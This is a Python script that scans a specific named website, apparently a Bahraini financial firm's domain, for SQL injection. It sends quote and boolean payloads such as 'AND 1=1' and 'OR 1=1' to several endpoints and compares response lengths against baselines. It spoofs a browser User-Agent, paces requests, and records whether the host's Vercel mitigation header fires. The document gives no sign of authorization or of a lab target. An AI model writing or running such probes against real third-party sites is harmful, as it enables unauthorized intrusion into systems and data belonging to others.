import requests, time, sys
T = "https://" + "www.infinitycapital" + ".bh"
S = requests.Session()
S.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"})

def get(path, **kw):
    r = S.get(T + path, timeout=25, allow_redirects=False, **kw)
    return r

# Baseline lengths per endpoint (2 samples)
def base(path, n=2):
    out = []
    for i in range(n):
        r = get(path)
        out.append((r.status_code, len(r.content)))
        time.sleep(0.8)
    return out

tests = {
 "/?id=1": ["/?id=1%27", "/?id=1%22", "/?id=1%20AND%201=1", "/?id=1%20AND%201=2", "/?id=1%20OR%201=1"],
 "/?page=2": ["/?page=2%27", "/?page=2%22", "/?page=2%20AND%201=1", "/?page=2%20AND%201=2", "/?page=2%20OR%201=1"],
 "/api/?id=1": ["/api/?id=1%27", "/?id=1%20AND%201=1", "/?id=1%20AND%201=2"],
 "/contact?cb=1": ["/contact?cb=1%27", "/?page=2"],
 "/_next/image?url=images%2Flogo.png&w=640&q=75": [
    "/_next/image?url=images%2Flogo.png&w=640%20AND%201=1&q=75",
    "/_next/image?url=images%2Flogo.png&w=640%20AND%201=2&q=75",
    "/_next/image?url=images%2Flogo.png&w=640&q=75%27",
    "/_next/image?url=images%2Flogo.png%27&w=640&q=75"],
}

for b, payloads in tests.items():
    bstat = base(b)
    print(f"\n### BASE {b} -> {bstat}")
    for p in payloads:
        path = p if p.startswith("/?") or "?" in p else b
        if not p.startswith("/_next") and "?" in p and p.startswith("/?"):
            path = b.split("?")[0] + p
        try:
            r = get(path)
            h = r.headers.get("x-vercel-mitigated", "-")
            print(f"   {path[:70]:70} {r.status_code} len={len(r.content):7} mit={h}")
        except Exception as e:
            print(path, "EXC", e)
        time.sleep(1.0)
